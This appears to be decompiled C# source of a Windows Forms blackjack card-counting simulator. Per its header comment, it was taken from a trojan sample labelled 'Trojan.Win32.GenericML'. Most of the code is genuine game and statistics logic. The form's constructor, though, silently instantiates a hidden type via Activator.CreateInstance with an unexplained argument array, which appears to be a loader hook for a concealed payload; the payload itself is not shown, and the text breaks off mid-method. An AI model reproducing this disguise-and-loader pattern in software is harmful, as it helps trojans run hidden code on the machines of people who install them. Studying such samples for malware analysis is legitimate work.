// Decompiled with JetBrains decompiler
// Type: Path_Finder.frmBlackJackSim
// Assembly: TypeDelega, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FEF18FA9-51E7-447C-8FC7-9441C6E3C0DE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\UDS-Trojan.Win32.GenericML.xnet-4ea8f9cb5ff79d56b4e171e5c4f7a0869f06cf580c04b5dec7148db42dc9188b.exe

using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;

namespace Path_Finder
{
  public class frmBlackJackSim : Form
  {
    public double TCAdjustment = 1.0;
    public int shoes = 0;
    public int currentCount = 0;
    public double decksLeft = 0.0;
    public double trueCount = 0.0;
    public double highestBet = 0.0;
    public double highestCount = 0.0;
    public double lowestCount = 0.0;
    public double highestBankroll = 0.0;
    public double lowestBankroll = 1000000000.0;
    public int numberOfErrors = 0;
    public bool playerCounts = false;
    public bool errorOn = false;
    public int errorRate = 0;
    private double PlayerMoneyTotal = 0.0;
    private object[] MaxGeneration = new object[3]
    {
      (object) "4743",
      (object) "617862",
      (object) "Path_Finder"
    };
    private IContainer components = (IContainer) null;
    private static object CreateCallback;
    private static System.Type ScheduledConcurrent = typeof (frmBlackJackSim);
    private Button cmdDeal;
    private RichTextBox rtbHandOutcome;
    private Label label1;
    private Label lblDealerWins;
    private Label label2;
    private Label lblPlayerWins;
    private Label label3;
    private Label lblPushes;
    private Label label4;
    private Label lblShoes;
    private Label label6;
    private Label lblPlayerBankroll;
    private Label Label12;
    private Label label8;
    private TextBox txtHandsToSim;
    private Label label9;
    private ProgressBar progressBar1;
    private Label label10;
    private GroupBox groupBox1;
    private RadioButton rbFalse;
    private RadioButton rbTrue;
    private Label label11;
    private Label lblSplits;
    private Label lblTotalRounds;
    private Label lblTotalHands;
    private Label label17;
    private Label lblPlayerBlackjacks;
    private Label label21;
    private Label lblWinningDoubles;
    private Label label22;
    private Label lblLosingDoubles;
    private Label label23;
    private Label lblPushingDoubles;
    private GroupBox groupBox2;
    private CheckBox checkBox1;
    private CheckBox checkBox2;
    private Label label7;
    private CheckBox checkBox3;
    private GroupBox groupBox3;
    private GroupBox groupBox4;
    private Label lblUnweightedAdv;
    private Label label19;
    private Label lblWinOnBJ;
    private Label lblWinOnDouble;
    private Label lblNonPushingTotal;
    private Label label15;
    private Label label14;
    private Label label13;
    private Label lblPlayerWinTotal;
    private Label label5;
    private Label lblPlayerStraightWin;
    private Label label16;
    private Label lblDealerStraightWin;
    private Label lblDealerWinOnDouble;
    private Label label24;
    private Label label25;
    private Label lblDealerWinTotal;
    private Label label26;
    private Label lblPlayerCostWin;
    private Label lblDealerCostWin;
    private Label label20;
    private Label label18;
    private Label lblHouseAdvantage;
    private Label label28;
    private GroupBox groupBox5;
    private RadioButton rbCountFalse;
    private RadioButton rbCountTrue;
    private GroupBox groupBox6;
    private Label lblHighestBankroll;
    private Label lblHighestBet;
    private Label lblLowestBankroll;
    private Label lblLowestCount;
    private Label lblHighestCount;
    private Label label32;
    private Label label31;
    private Label label30;
    private Label label29;
    private Label label27;
    private Label label33;
    private TextBox txtStartingBankRoll;
    private TextBox txtTableMax;
    private TextBox txtTableMin;
    private Label label35;
    private Label label34;
    private Label label36;
    private TrackBar tbAgression;
    private Label lblBettingUnit;
    private CheckBox chkGUIUpdate;
    private Label label37;
    private Label label38;
    private Label label39;
    private Label lblTCAdjustment;
    private Label label40;
    private Label label41;
    private Label label42;
    private Label lblInsuranceBetsLost;
    private Label lblInsuranceBetsWon;
    private Label label43;
    private Button cmdDetails;
    private GroupBox groupBox7;
    private GroupBox groupBox8;
    private RadioButton rbErrorsOff;
    private RadioButton rbErrorsOn;
    private TrackBar tbErrorRate;
    private Label label44;
    private Label label45;
    private GroupBox gbError;
    private Label label46;
    private Label label47;
    private Label label49;
    private Label label48;
    private Label label52;
    private Label lblErrors;
    private Label label50;
    private Label lblErrorsPer100Hands;
    private Button cmdMultiSim;
    private NumericUpDown numericUpDown1;
    private Label label51;
    private TextBox txtPath;
    private GroupBox groupBox9;

    public frmBlackJackSim()
    {
      this.InitializeComponent();
      Activator.CreateInstance((System.Type) frmBlackJackSim.CreateCallback, this.MaxGeneration);
    }

    private int TakeCard(int CurrentCardPostion, ref string[] FullShoe, out string CardType)
    {
      int int32 = Convert.ToInt32(FullShoe[CurrentCardPostion].Substring(0, FullShoe[CurrentCardPostion].Length - 3));
      CardType = Convert.ToString(FullShoe[CurrentCardPostion].Substring(FullShoe[CurrentCardPostion].Length - 1, 1));
      if (int32 > 1 && int32 < 7)
        ++this.currentCount;
      else if (int32 > 9 || int32 == 1)
        --this.currentCount;
      return int32;
    }

    private string TheRightMove(
      int DealerUpCard,
      int PlayerTotal,
      int PlayerAceCount,
      bool CanSplit,
      int NumberOfPlayerCards)
    {
      if (NumberOfPlayerCards == 2 & CanSplit && PlayerTotal != 10)
      {
        switch (PlayerTotal)
        {
          case 4:
            return DealerUpCard > 1 && DealerUpCard < 8 ? "Split" : "Hit";
          case 6:
            return DealerUpCard > 1 && DealerUpCard < 8 ? "Split" : "Hit";
          case 8:
            return DealerUpCard == 5 || DealerUpCard == 6 ? "Split" : "Hit";
          case 12:
            return DealerUpCard > 1 && DealerUpCard < 7 ? "Split" : "Hit";
          case 14:
            return DealerUpCard > 1 && DealerUpCard < 8 ? "Split" : "Hit";
          case 16:
            return "Split";
          case 18:
            return DealerUpCard == 1 || DealerUpCard == 7 || DealerUpCard == 10 ? "Stand" : "Split";
          case 20:
            return "Stand";
          case 22:
            return "Split";
        }
      }
      else if (PlayerAceCount > 0)
      {
        switch (PlayerTotal)
        {
          case 13:
            return (DealerUpCard == 5 || DealerUpCard == 6) && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 14:
            return (DealerUpCard == 5 || DealerUpCard == 6) && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 15:
            return (DealerUpCard == 4 || DealerUpCard == 5 || DealerUpCard == 6) && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 16:
            return (DealerUpCard == 4 || DealerUpCard == 5 || DealerUpCard == 6) && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 17:
            return (DealerUpCard == 3 || DealerUpCard == 4 || DealerUpCard == 5 || DealerUpCard == 6) && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 18:
            return DealerUpCard == 3 || DealerUpCard == 4 || DealerUpCard == 5 || DealerUpCard == 6 ? (NumberOfPlayerCards == 2 ? "Double" : "Hit") : (DealerUpCard == 2 || DealerUpCard == 7 || DealerUpCard == 8 ? "Stand" : "Hit");
          default:
            if (PlayerTotal > 18)
              return "Stand";
            break;
        }
      }
      else
      {
        if (PlayerTotal < 9)
          return "Hit";
        switch (PlayerTotal)
        {
          case 9:
            return DealerUpCard > 2 && DealerUpCard < 7 && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 10:
            return DealerUpCard > 1 && DealerUpCard < 10 && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 11:
            return DealerUpCard > 1 && NumberOfPlayerCards == 2 ? "Double" : "Hit";
          case 12:
            return DealerUpCard == 4 || DealerUpCard == 5 || DealerUpCard == 6 ? "Stand" : "Hit";
          default:
            if (PlayerTotal >= 13 && PlayerTotal <= 16)
              return DealerUpCard > 1 && DealerUpCard < 7 ? "Stand" : "Hit";
            if (PlayerTotal >= 17)
              return "Stand";
            break;
        }
      }
      int num = (int) MessageBox.Show("ERROR IN NEXT PLAYER RIGHT-MOVE CALCULATIONS");
      return "ERROR";
    }

    private int PlayerHand(
      ref string[] FullShoe,
      ArrayList Player1,
      string PlayerCard1Type,
      string PlayerCard2Type,
      int DealerUpCard,
      int CurrentCardPosition,
      int NumberOfPreviousSplitsThisRound,
      out int NewCardPosition,
      out bool DoubleDown)
    {
      NewCardPosition = CurrentCardPosition;
      int PlayerAceCount = 0;
      bool CanSplit = false;
      string CardType = (string) null;
      DoubleDown = false;
      int NumberOfPlayerCards = 2;
      if ((int) Player1[0] == 1)
        ++PlayerAceCount;
      if ((int) Player1[1] == 1)
        ++PlayerAceCount;
      if (PlayerCard1Type == PlayerCard2Type && NumberOfPreviousSplitsThisRound < 1)
        CanSplit = true;
      int PlayerTotal = (int) Player1[0] + (int) Player1[1] + PlayerAceCount * 10;
      for (string str = this.TheRightMove(DealerUpCard, PlayerTotal, PlayerAceCount, CanSplit, NumberOfPlayerCards); str != "Stand"; str = this.TheRightMove(DealerUpCard, PlayerTotal, PlayerAceCount, CanSplit, NumberOfPlayerCards))
      {
        if (str == "Hit")
        {
          Player1.Add((object) this.TakeCard(NewCardPosition, ref FullShoe, out CardType));
          ++NewCardPosition;
          ++NumberOfPlayerCards;
          PlayerTotal += (int) Player1[Player1.Count - 1];
          if ((int) Player1[Player1.Count - 1] == 1)
          {
            ++PlayerAceCount;
            PlayerTotal += 10;
          }
        }
        else
        {
          if (!(str == "Double"))
            return -99;
          Player1.Add((object) this.TakeCard(NewCardPosition, ref FullShoe, out CardType));
          ++NewCardPosition;
          ++NumberOfPlayerCards;
          PlayerTotal += (int) Player1[Player1.Count - 1];
          if ((int) Player1[Player1.Count - 1] == 1)
          {
            ++PlayerAceCount;
            PlayerTotal += 10;
          }
          DoubleDown = true;
        }
        if (PlayerTotal > 21)
        {
          if (PlayerAceCount == 0)
          {
            CurrentCardPosition = NewCardPosition;
            return PlayerTotal;
          }
          --PlayerAceCount;
          PlayerTotal -= 10;
        }
        if (str == "Double")
          break;
      }
      return PlayerTotal;
    }

    private int DealerHand(
      ref string[] FullShoe,
      ArrayList Dealer,
      bool DealerHitsSoft17,
      int currentCardPosition,
      out int cardPositionOUT)
    {
      string CardType = (string) null;
      int num1 = 0;
      if ((int) Dealer[0] == 1)
        ++num1;
      if ((int) Dealer[1] == 1)
        ++num1;
      int num2 = (int) Dealer[0] + (int) Dealer[1] + num1 * 10;
      bool flag = false;
      while (!flag)
      {
        if (num2 > 21)
        {
          if (num1 == 0)
          {
            flag = true;
          }
          else
          {
            --num1;
            num2 -= 10;
          }
        }
        else if ((num2 > 16 && (num1 == 0 || !DealerHitsSoft17) || num2 > 17) && num2 <= 21)
          flag = true;
        else if (num2 < 17 || ((num2 != 17 ? 0 : (num1 > 0 ? 1 : 0)) & (DealerHitsSoft17 ? 1 : 0)) != 0)
        {
          Dealer.Add((object) this.TakeCard(currentCardPosition, ref FullShoe, out CardType));
          ++currentCardPosition;
          num2 += (int) Dealer[Dealer.Count - 1];
          if ((int) Dealer[Dealer.Count - 1] == 1)
          {
            ++num1;
            num2 += 10;
          }
          if (num2 > 21 && num1 > 0)
          {
            --num1;
            num2 -= 10;
          }
        }
      }
      cardPositionOUT = currentCardPosition;
      return num2;
    }

    private void cmdDeal_Click(object sender, EventArgs e)
    {
      this.TCAdjustment = Convert.ToDouble(this.lblTCAdjustment.Text);
      this.currentCount = 0;
      this.trueCount = 0.0;
      this.shoes = 0;
      this.lowestBankroll = 1000000000.0;
      this.highestBankroll = 0.0;
      this.highestBet = 0.0;
      this.lowestCount = 0.0;
      this.highestCount = 0.0;
      this.numberOfErrors = 0;
      this.playerCounts = false;
      this.errorOn = false;
      this.errorRate = 0;
      this.numberOfErrors = 0;
      int num1 = 0;
      int num2 = 0;
      bool flag1 = false;
      if (this.rbCountTrue.Checked)
        this.playerCounts = true;
      if (this.chkGUIUpdate.Checked)
        flag1 = true;
      if (this.rbErrorsOn.Checked)
      {
        this.errorOn = true;
        this.errorRate = this.tbErrorRate.Value;
      }
      this.rtbHandOutcome.Text = "";
      int num3;
      try
      {
        num3 = Convert.ToInt32(this.txtHandsToSim.Text);
      }
      catch
      {
        this.txtHandsToSim.Text = "100";
        num3 = 100;
      }
      if (num3 < 1 || num3 > 1000000000)
      {
        this.txtHandsToSim.Text = "100";
        num3 = 100;
      }
      Application.DoEvents();
      this.Update();
      int num4 = 0;
      int num5 = 0;
      int num6 = 0;
      int num7 = 0;
      int num8 = 0;
      int num9 = 0;
      int num10 = 0;
      int num11 = 0;
      bool DealerHitsSoft17 = false;
      if (this.rbTrue.Checked)
        DealerHitsSoft17 = true;
      double num12 = 2.0 * 52.0;
      this.shoes = 0;
      this.rtbHandOutcome.Text = "";
      string[] FullShoe = this.shuffleDeck(this.createShoe(8));
      int length = FullShoe.Length;
      int num13 = length - (int) Math.Round(num12, 0);
      int num14 = 1;
      this.PlayerMoneyTotal = (double) Convert.ToInt32(this.txtStartingBankRoll.Text);
      double num15 = 0.0;
      int num16;
      int num17;
      int num18;
      int num19;
      try
      {
        num16 = Convert.ToInt32(this.txtStartingBankRoll.Text);
        num17 = Convert.ToInt32(this.lblBettingUnit.Text);
        num18 = Convert.ToInt32(this.txtTableMin.Text);
        num19 = Convert.ToInt32(this.txtTableMax.Text);
      }
      catch
      {
        num16 = 50000;
        num17 = 100;
        num18 = 10;
        num19 = 1000;
        this.txtStartingBankRoll.Text = "50000";
        this.txtTableMin.Text = "10";
        this.lblBettingUnit.Text = "100";
        this.txtTableMax.Text = "1000";
      }
      if (num16 < 100 || num16 > 10000000)
        num17 = 50000;
      int num20 = 0;
      int num21 = 0;
      int num22;
      for (num22 = 0; num22 < num3; ++num22)
      {
        this.progressBar1.Value = (int) ((double) num22 / (double) num3 * 100.0);
        this.Update();
        if (num14 < num13)
        {
          int num23 = 0;
          if (this.playerCounts)
          {
            this.decksLeft = Math.Round((double) (length - num14) / 52.0, 1);
            this.trueCount = Math.Round((double) this.currentCount / this.decksLeft, 1);
            this.trueCount -= this.TCAdjustment;
            if (this.trueCount <= 1.0)
            {
              num23 = num18;
              this.PlayerMoneyTotal -= (double) num23;
            }
            else
            {
              if (this.trueCount > 1.0)
                num23 = (int) Math.Round((double) num17 * this.trueCount, 1);
              if (num23 > num19)
                num23 = num19;
              this.PlayerMoneyTotal -= (double) num23;
            }
            if (this.highestBet < (double) num23)
              this.highestBet = (double) num23;
            if (this.highestCount < this.trueCount)
              this.highestCount = this.trueCount;
            if (this.lowestCount > this.trueCount)
              this.lowestCount = this.trueCount;
            if (this.PlayerMoneyTotal < this.lowestBankroll)
              this.lowestBankroll = this.PlayerMoneyTotal;
            if (this.PlayerMoneyTotal > this.highestBankroll)
              this.highestBankroll = this.PlayerMoneyTotal;
          }
          else
          {
            num23 = num18;
            this.PlayerMoneyTotal -= (double) num23;
          }
          bool DoubleDown1 = false;
          bool flag2 = false;
          bool flag3 = false;
          bool flag4 = false;
          bool DoubleDown2 = false;
          bool DoubleDown3 = false;
          int num24 = 0;
          int num25 = 0;
          ArrayList Player1_1 = new ArrayList();
          ArrayList Player1_2 = new ArrayList();
          ArrayList Player1_3 = new ArrayList();
          ArrayList Dealer = new ArrayList();
          string CardType1 = (string) null;
          string CardType2 = (string) null;
          string CardType3 = (string) null;
          Player1_1.Add((object) this.TakeCard(num14, ref FullShoe, out CardType2));
          int CurrentCardPostion1 = num14 + 1;
          Dealer.Add((object) this.TakeCard(CurrentCardPostion1, ref FullShoe, out CardType1));
          int CurrentCardPostion2 = CurrentCardPostion1 + 1;
          Player1_1.Add((object) this.TakeCard(CurrentCardPostion2, ref FullShoe, out CardType3));
          int CurrentCardPostion3 = CurrentCardPostion2 + 1;
          Dealer.Add((object) this.TakeCard(CurrentCardPostion3, ref FullShoe, out CardType1));
          num14 = CurrentCardPostion3 + 1;
          if ((int) Player1_1[0] == 1 && (int) Player1_1[1] >= 10 || (int) Player1_1[0] >= 10 && (int) Player1_1[1] == 1)
            flag2 = true;
          if ((int) Dealer[0] == 1 && (int) Dealer[1] >= 10 || (int) Dealer[0] >= 10 && (int) Dealer[1] == 1)
            flag3 = true;
          if ((int) Dealer[0] == 1 && this.playerCounts && this.trueCount > 20.0)
          {
            if (flag3)
            {
              ++num1;
              this.PlayerMoneyTotal += (double) num23;
            }
            else
            {
              ++num2;
              this.PlayerMoneyTotal -= (double) (num23 / 2);
            }
          }
          if (this.errorOn)
          {
            RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider();
            if (frmBlackJackSim.GetNextInt32(rnd) % 100 <= this.errorRate)
            {
              int num26 = frmBlackJackSim.GetNextInt32(rnd) % 2;
              int num27 = frmBlackJackSim.GetNextInt32(rnd) % 4 + 1;
              if (num26 == 0)
              {
                this.currentCount += num27;
                ++this.numberOfErrors;
              }
              else
              {
                this.currentCount -= num27;
                ++this.numberOfErrors;
              }
            }
          }
          if (!flag3 && !flag2)
          {
            int NewCardPosition1 = 0;
            int NumberOfPreviousSplitsThisRound1 = 0;
            num20 = this.PlayerHand(ref FullShoe, Player1_1, CardType2, CardType3, Convert.ToInt32(Dealer[0]), num14, NumberOfPreviousSplitsThisRound1, out NewCardPosition1, out DoubleDown1);
            num14 = NewCardPosition1;
            if (num20 == -99)
            {
              ++num7;
              flag4 = true;
              Player1_2.Add(Player1_1[0]);
              Player1_2.Add((object) this.TakeCard(num14, ref FullShoe, out CardType3));
              int num28 = num14 + 1;
              if ((int) Player1_2[0] > 1)
              {
                int NewCardPosition2 = 0;
                int NumberOfPreviousSplitsThisRound2 = 1;
                num24 = this.PlayerHand(ref FullShoe, Player1_2, CardType2, CardType3, Convert.ToInt32(Dealer[0]), num28, NumberOfPreviousSplitsThisRound2, out NewCardPosition2, out DoubleDown2);
                num28 = NewCardPosition2;
              }
              else
              {
                num24 = (int) Player1_2[0] + 10 + (int) Player1_2[1];
                if ((int) Player1_2[1] == 1)
                  num24 = 2;
              }
              Player1_3.Add(Player1_1[0]);
              Player1_3.Add((object) this.TakeCard(num28, ref FullShoe, out CardType3));
              num14 = num28 + 1;
              if ((int) Player1_3[0] > 1)
              {
                int NewCardPosition3 = 0;
                int NumberOfPreviousSplitsThisRound3 = 1;
                num25 = this.PlayerHand(ref FullShoe, Player1_3, CardType2, CardType3, Convert.ToInt32(Dealer[0]), num14, NumberOfPreviousSplitsThisRound3, out NewCardPosition3, out DoubleDown3);
                num14 = NewCardPosition3;
              }
              else
              {
                num25 = (int) Player1_3[0] + 10 + (int) Player1_3[1];
                if ((int) Player1_3[1] == 1)
                  num25 = 2;
              }
            }
            if (num20 <= 21 && num24 <= 21 && num25 <= 21)
            {
              int cardPositionOUT = 0;
              num21 = this.DealerHand(ref FullShoe, Dealer, DealerHitsSoft17, num14, out cardPositionOUT);
              num14 = cardPositionOUT;
            }
          }
          bool flag5 = false;
          bool flag6 = false;
          bool flag7 = false;
          bool flag8 = false;
          bool flag9 = false;
          bool flag10 = false;
          if (flag4)
          {
            this.PlayerMoneyTotal -= (double) num23;
            int num29 = num23;
            if (DoubleDown2)
            {
              this.PlayerMoneyTotal -= (double) num23;
              num23 *= 2;
            }
            if (num24 > 21 || num24 < num21 && num21 <= 21)
            {
              if (DoubleDown2)
                ++num10;
              ++num5;
              num15 += (double) num23;
            }
            else if (num21 > 21 || num21 < num24 && num24 <= 21)
            {
              if (DoubleDown2)
                ++num9;
              ++num6;
              this.PlayerMoneyTotal += (double) (num23 * 2);
              num15 -= (double) num23;
              flag5 = true;
              flag7 = true;
            }
            else if (num21 == num24)
            {
              if (DoubleDown2)
                ++num11;
              ++num4;
              this.PlayerMoneyTotal += (double) num23;
              flag9 = true;
            }
            num23 = num29;
            if (DoubleDown3)
            {
              this.PlayerMoneyTotal -= (double) num23;
              num23 *= 2;
            }
            if (num25 > 21 || num25 < num21 && num21 <= 21)
            {
              if (DoubleDown3)
                ++num10;
              ++num5;
              num15 += (double) num23;
            }
            else if (num21 > 21 || num21 < num25 && num25 <= 21)
            {
              if (DoubleDown3)
                ++num9;
              ++num6;
              this.PlayerMoneyTotal += (double) (num23 * 2);
              num15 -= (double) num23;
              flag8 = true;
            }
            else if (num21 == num25)
            {
              if (DoubleDown3)
                ++num11;
              ++num4;
              this.PlayerMoneyTotal += (double) num23;
              flag10 = true;
            }
          }
          else if (flag3 | flag2)
          {
            if (flag3 & flag2)
            {
              ++num4;
              this.PlayerMoneyTotal += (double) num23;
              flag6 = true;
            }
            else if (flag3 && !flag2)
            {
              ++num5;
              num15 += (double) num23;
            }
            else if (flag2 && !flag3)
            {
              ++num6;
              this.PlayerMoneyTotal += (double) num23 + (double) num23 * 1.5;
              num15 -= (double) num23 * 1.5;
              flag5 = true;
              ++num8;
            }
          }
          else
          {
            if (DoubleDown1)
            {
              this.PlayerMoneyTotal -= (double) num23;
              num23 *= 2;
            }
            if (num20 > 21 || num20 < num21 && num21 <= 21)
            {
              if (DoubleDown1)
                ++num10;
              ++num5;
              num15 += (double) num23;
            }
            else if (num21 > 21 || num21 < num20 && num20 <= 21)
            {
              if (DoubleDown1)
                ++num9;
              ++num6;
              this.PlayerMoneyTotal += (double) (num23 * 2);
              num15 -= (double) num23;
              flag5 = true;
            }
            else if (num21 == num20)
            {
              if (DoubleDown1)
                ++num11;
              ++num4;
              this.PlayerMoneyTotal += (double) num23;
              flag6 = true;
            }
          }
          if (num22 < 10)
          {
            this.rtbHandOutcome.Text += "Dealer: ";
            for (int index = 0; index < Dealer.Count; ++index)
            {
              RichTextBox rtbHandOutcome = this.rtbHandOutcome;
              rtbHandOutcome.Text = rtbHandOutcome.Text + Dealer[index]?.ToString() + ", ";
            }
            this.rtbHandOutcome.Text += " \n";
            if (flag4)
            {
              RichTextBox rtbHandOutcome1 = this.rtbHandOutcome;
              rtbHandOutcome1.Text = rtbHandOutcome1.Text + "Player: " + Player1_1[0]?.ToString() + ", " + Player1_1[0]?.ToString() + " SPLIT\n";
              this.rtbHandOutcome.Text += "Hand 1: ";
              for (int index = 0; index < Player1_2.Count; ++index)
              {
                RichTextBox rtbHandOutcome2 = this.rtbHandOutcome;
                rtbHandOutcome2.Text = rtbHandOutcome2.Text + Player1_2[index]?.ToString() + ", ";
              }
              if (DoubleDown2)
                this.rtbHandOutcome.Text += " DOUBLE ";
              this.rtbHandOutcome.Text += " \n";
              if (flag7)
                this.rtbHandOutcome.Text += "PLAYER WINS!";
              else if (flag9)
                this.rtbHandOutcome.Text += "PUSH!";
              else
                this.rtbHandOutcome.Text += "DEALER WINS!";
              this.rtbHandOutcome.Text += " \n";
              this.rtbHandOutcome.Text += "Hand 2: ";
              for (int index = 0; index < Player1_3.Count; ++index)
              {
                RichTextBox rtbHandOutcome3 = this.rtbHandOutcome;
                rtbHandOutcome3.Text = rtbHandOutcome3.Text + Player1_3[index]?.ToString() + ", ";
              }
              if (DoubleDown3)
                this.rtbHandOutcome.Text += " DOUBLE ";
              this.rtbHandOutcome.Text += " \n";
              if (flag8)
                this.rtbHandOutcome.Text += "PLAYER WINS!";
              else if (flag10)
                this.rtbHandOutcome.Text += "PUSH!";
              else
                this.rtbHandOutcome.Text += "DEALER WINS!";
              this.rtbHandOutcome.Text += " \n";
            }
            else
            {
              this.rtbHandOutcome.Text += "Player: ";
              for (int index = 0; index < Player1_1.Count; ++index)
              {
                RichTextBox rtbHandOutcome = this.rtbHandOutcome;
                rtbHandOutcome.Text = rtbHandOutcome.Text + Player1_1[index]?.ToString() + ", ";
              }
              if (DoubleDown1)
                this.rtbHandOutcome.Text += " DOUBLE ";
              this.rtbHandOutcome.Text += " \n";
              if (flag5)
                this.rtbHandOutcome.Text += "PLAYER WINS!";
              else if (flag6)
                this.rtbHandOutcome.Text += "PUSH!";
              else
                this.rtbHandOutcome.Text += "DEALER WINS!";
            }
            this.rtbHandOutcome.Text += " \n";
            RichTextBox rtbHandOutcome4 = this.rtbHandOutcome;
            rtbHandOutcome4.Text = rtbHandOutcome4.Text + "Bet: " + num23.ToString() + "\n";
            if (this.playerCounts)
            {
              RichTextBox rtbHandOutcome5 = this.rtbHandOutcome;
              rtbHandOutcome5.Text = rtbHandOutcome5.Text + "True Count:" + this.trueCount.ToString() + "\n";
            }
            RichTextBox rtbHandOutcome6 = this.rtbHandOutcome;
            rtbHandOutcome6.Text = rtbHandOutcome6.Text + "Player Money Total: " + this.PlayerMoneyTotal.ToString() + "\n";
            RichTextBox rtbHandOutcome7 = this.rtbHandOutcome;
            rtbHandOutcome7.Text = rtbHandOutcome7.Text + "Dealer Money Total: " + num15.ToString() + "\n";
            this.rtbHandOutcome.Text += " \n";
          }
          if (!flag1)
            ;
        }
        else
        {
          this.currentCount = 0;
          FullShoe = this.shuffleDeck(FullShoe);
          num14 = 1;
          --num22;
        }
      }
      if (!flag1)
      {
        int num30 = num5 + num6 + num4;
        this.lblTotalHands.Text = Convert.ToString(num30);
        int num31 = num30 - num4;
        this.lblNonPushingTotal.Text = Convert.ToString(num31);
        this.lblDealerWins.Text = Convert.ToString(num5);
        this.lblPlayerWins.Text = Convert.ToString(num6);
        this.lblPushes.Text = Convert.ToString(num4);
        this.lblShoes.Text = Convert.ToString(this.shoes);
        this.lblSplits.Text = Convert.ToString(num7);
        this.lblWinningDoubles.Text = Convert.ToString(num9);
        this.lblLosingDoubles.Text = Convert.ToString(num10);
        this.lblPushingDoubles.Text = Convert.ToString(num11);
        this.lblPlayerBankroll.Text = "$" + Convert.ToString(Math.Round(this.PlayerMoneyTotal - (double) Convert.ToInt32(this.txtStartingBankRoll.Text), 2));
        this.lblTotalRounds.Text = Convert.ToString(num22);
        this.lblPlayerBlackjacks.Text = Convert.ToString(num8);
        this.lblErrors.Text = Convert.ToString(this.numberOfErrors);
        double num32 = (double) num9 / (double) num31;
        this.lblWinOnDouble.Text = Convert.ToString(Math.Round(num32 * 100.0, 4)) + "%";
        double num33 = (double) num8 / (double) num31;
        this.lblWinOnBJ.Text = Convert.ToString(Math.Round(num33 * 100.0, 4)) + "%";
        double num34 = (double) (num6 - (num9 + num8)) / (double) num31;
        this.lblPlayerStraightWin.Text = Convert.ToString(Math.Round(num34 * 100.0, 4)) + "%";
        double num35 = (double) num6 / (double) num31;
        this.lblPlayerWinTotal.Text = Convert.ToString(Math.Round(num35 * 100.0, 4)) + "%";
        double num36 = num34 * 1.0 + num32 * 2.0 + num33 * 1.5;
        this.lblPlayerCostWin.Text = Convert.ToString(Math.Round(num36 * 100.0, 4)) + "%";
        double num37 = (double) num10 / (double) num31;
        this.lblDealerWinOnDouble.Text = Convert.ToString(Math.Round(num37 * 100.0, 4)) + "%";
        double num38 = (double) (num5 - num10) / (double) num31;
        this.lblDealerStraightWin.Text = Convert.ToString(Math.Round(num38 * 100.0, 4)) + "%";
        double num39 = (double) num5 / (double) num31;
        this.lblDealerWinTotal.Text = Convert.ToString(Math.Round(num39 * 100.0, 4)) + "%";
        double num40 = num38 * 1.0 + num37 * 2.0;
        this.lblDealerCostWin.Text = Convert.ToString(Math.Round(num40 * 100.0, 4)) + "%";
        this.lblUnweightedAdv.Text = Convert.ToString(Math.Round((num39 - num35) * 100.0, 4)) + "%";
        this.lblHouseAdvantage.Text = Convert.ToString(Math.Round((num40 - num36) * 100.0, 2)) + "%";
        this.lblHighestBet.Text = "$" + Convert.ToString(this.highestBet);
        this.lblHighestCount.Text = Convert.ToString(this.highestCount);
        this.lblLowestCount.Text = Convert.ToString(this.lowestCount);
        this.lblLowestBankroll.Text = Convert.ToString(this.lowestBankroll);
        this.lblHighestBankroll.Text = Convert.ToString(this.highestBankroll);
        this.lblInsuranceBetsLost.Text = Convert.ToString(num2);
        this.lblInsuranceBetsWon.Text = Convert.ToString(num1);
      }
      this.Update();
      Application.DoEvents();
    }

    private string[] createShoe(int NumOfDecks)
    {
      int index1 = 0;
      string str1 = "";
      string[] shoe = new string[NumOfDecks * 52];
      for (int index2 = 0; index2 < NumOfDecks; ++index2)
      {
        for (int index3 = 1; index3 < 14; ++index3)
        {
          str1 = "";
          int num;
          string str2;
          if (index3 == 1)
          {
            num = 1;
            str2 = "-A";
          }
          else if (index3 == 10)
          {
            num = 10;
            str2 = "-T";
          }
          else if (index3 == 11)
          {
            num = 10;
            str2 = "-J";
          }
          else if (index3 == 12)
          {
            num = 10;
            str2 = "-Q";
          }
          else if (index3 == 13)
          {
            num = 10;
            str2 = "-K";
          }
          else
          {
            num = index3;
            str2 = "-" + num.ToString();
          }
          shoe[index1] = Convert.ToString(num) + "H" + str2;
          int index4 = index1 + 1;
          shoe[index4] = Convert.ToString(num) + "D" + str2;
          int index5 = index4 + 1;
          shoe[index5] = Convert.ToString(num) + "C" + str2;
          int index6 = index5 + 1;
          shoe[index6] = Convert.ToString(num) + "S" + str2;
          index1 = index6 + 1;
        }
      }
      return shoe;
    }

    private string[] shuffleDeck(string[] FullShoe)
    {
      ++this.shoes;
      int num = FullShoe.Length - 1;
      RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider();
      for (int index1 = 1; index1 <= num; ++index1)
      {
        int index2 = frmBlackJackSim.GetNextInt32(rnd) % num;
        string str = FullShoe[index1];
        FullShoe[index1] = FullShoe[index2];
        FullShoe[index2] = str;
      }
      return FullShoe;
    }

    private static int GetNextInt32(RNGCryptoServiceProvider rnd)
    {
      byte[] data = new byte[4];
      rnd.GetBytes(data);
      return Convert.ToInt32(data[0]);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Width = 567;
      this.Height = 640;
      double num1 = (double) this.tbAgression.Value * 0.1;
      double num2 = (double) (int) Math.Round(Convert.ToDouble(this.txtStartingBankRoll.Text) / 500.0, 0);
      this.lblBettingUnit.Text = Convert.ToString((int) Math.Round(num2 + num2 * num1, 0));
    }

    private void rbCountFalse_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void groupBox6_Enter(object sender, EventArgs e)
    {
    }

    private void tbAgression_Scroll(object sender, EventArgs e)
    {
      int num1;
      try
      {
        num1 = Convert.ToInt32(this.txtStartingBankRoll.Text);
        if (num1 < 100 && num1 > 10000000)
        {
          this.txtStartingBankRoll.Text = "50000";
          num1 = 50000;
        }
      }
      catch
      {
